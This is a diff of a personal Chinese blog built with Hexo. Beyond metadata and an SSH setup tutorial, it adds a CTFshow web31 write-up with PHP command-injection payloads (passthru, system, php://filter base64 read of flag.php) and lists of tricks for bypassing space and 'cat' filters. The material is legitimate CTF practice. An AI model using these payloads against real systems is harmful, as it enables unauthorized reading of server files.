@@ -258,7 +258,7 @@
 <p>npm install hexo-deployer-git –save</p>
 <p> 3.输入cd ~/.ssh,如果出现入下图情况，说明不存在.ssh</p>
 <p><img src="/2022/01/20/BLOG-%E6%90%AD%E5%BB%BA/image-20220120134422521.png" alt="image-20220120134422521"></p>
-<p> 解决方法：输入 $ ssh-keygen -t rsa -C “<a href="mailto:&#x78;&#120;&#120;&#x78;&#120;&#120;&#x78;&#64;&#113;&#113;&#x2e;&#99;&#x6f;&#x6d;">&#x78;&#120;&#120;&#x78;&#120;&#120;&#x78;&#64;&#113;&#113;&#x2e;&#99;&#x6f;&#x6d;</a>“(自己邮箱) 再次如下图进行操作，出现相同文件说明成功</p>
+<p> 解决方法：输入 $ ssh-keygen -t rsa -C “<a href="mailto:&#x78;&#x78;&#x78;&#x78;&#x78;&#x78;&#120;&#x40;&#x71;&#113;&#46;&#99;&#x6f;&#x6d;">&#x78;&#x78;&#x78;&#x78;&#x78;&#x78;&#120;&#x40;&#x71;&#113;&#46;&#99;&#x6f;&#x6d;</a>“(自己邮箱) 再次如下图进行操作，出现相同文件说明成功</p>
 <img src="/2022/01/20/BLOG-%E6%90%AD%E5%BB%BA/image-20220120134448931.png" alt="image-20220120134448931" style="zoom:80%;">
 
 <p>4.输入eval “$(ssh-agent -s)”，添加密钥到ssh-agent</p>
@@ -268,7 +268,7 @@
 
 <p><img src="/2022/01/20/BLOG-%E6%90%AD%E5%BB%BA/image-20220120134641323.png" alt="image-20220120134641323"></p>
 <p>填写key<img src="/2022/01/20/BLOG-%E6%90%AD%E5%BB%BA/image-20220120134719640.png" alt="image-20220120134719640"></p>
-<p>6.输入ssh -T <a href="mailto:&#103;&#x69;&#x74;&#x40;&#103;&#x69;&#116;&#104;&#117;&#x62;&#x2e;&#x63;&#111;&#109;">&#103;&#x69;&#x74;&#x40;&#103;&#x69;&#116;&#104;&#117;&#x62;&#x2e;&#x63;&#111;&#109;</a>，测试添加ssh是否成功。如果看到Hi后面是你的用户名，就说明成功了（有一个会让你输入 yes）</p>
+<p>6.输入ssh -T <a href="mailto:&#x67;&#105;&#116;&#x40;&#x67;&#105;&#116;&#104;&#117;&#98;&#x2e;&#x63;&#111;&#x6d;">&#x67;&#105;&#116;&#x40;&#x67;&#105;&#116;&#104;&#117;&#98;&#x2e;&#x63;&#111;&#x6d;</a>，测试添加ssh是否成功。如果看到Hi后面是你的用户名，就说明成功了（有一个会让你输入 yes）</p>
 <p>7.设置你的账号信息<img src="/2022/01/20/BLOG-%E6%90%AD%E5%BB%BA/image-20220120134805292.png" alt="image-20220120134805292"></p>
 <p>name和email后写自己的即可</p>
 <p>8.部署到github  hexo d     使用用户名.github.io 即可访问自己博客 </p>
@@ -371,7 +371,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2022-01-21 19:58:37" itemprop="dateModified" datetime="2022-01-21T19:58:37+08:00">2022-01-21</time>
+      <time title="Modified: 2022-01-21 23:02:09" itemprop="dateModified" datetime="2022-01-21T23:02:09+08:00">2022-01-21</time>
     </span>
 
   
@@ -381,7 +381,7 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">Symbols count in article: </span>
-      <span>5.1k</span>
+      <span>5.6k</span>
     </span>
     <span class="post-meta-item" title="Reading time">
       <span class="post-meta-item-icon">
@@ -640,7 +640,17 @@
 <p>这里采用反引号绕过<img src="/2022/01/20/CTFshow/image-20220121165055553.png" alt="image-20220121165055553"></p>
 <p>查看网页源代码即可得到flag</p>
 <p>方法三：采用passthru()函数：payload：?c=passthru(“cat fla*”);</p>
-
+<h2 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h2><p><img src="/2022/01/20/CTFshow/image-20220121223323191.png" alt="image-20220121223323191"></p>
+<p>过滤了system|cat|flag|空格单引号</p>
+<p>方法一：<img src="/2022/01/20/CTFshow/image-20220121223757658.png" alt="image-20220121223757658"></p>
+<p>a=system(“cat flag.php”); 之后查看网页源代码得到flag</p>
+<p>方法二：</p>
+<p><strong>空格绕过</strong>                                                                                                                                                   &gt; &lt; &lt;&gt; 重定向符<br>%09(需要php环境)<br>${IFS}<br>$IFS$9<br>{cat,flag.php} //用逗号实现了空格功能<br>%20<br>%09</p>
+<p><strong>cat被过滤</strong>                                                                                                                                                                             more:一页一页的显示档案内容<br>less:与 more 类似<br>head:查看头几行<br>tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示<br>tail:查看尾几行<br>nl：显示的时候，顺便输出行号<br>od:以二进制的方式读取档案内容<br>vi:一种编辑器，这个也可以查看<br>vim:一种编辑器，这个也可以查看<br>sort:可以查看<br>uniq:可以查看<br>file -f:报错出具体内容</p>
+<p>payload: ?c=passthru(“more%09f*”);   <img src="/2022/01/20/CTFshow/image-20220121225223264.png" alt="image-20220121225223264"></p>
+<p>加反引号</p>
+<p>payload：?c=include($_GET[“url”]);?&gt;&amp;url=php://filter/read=convert.base64-encode/resource=flag.php           在base64解码即可</p>
+<h2 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h2>
       
     </div>
 
@@ -776,7 +786,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="Reading time total">7 mins.</span>
+    <span title="Reading time total">8 mins.</span>
   </span>
 </div>
   <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a>
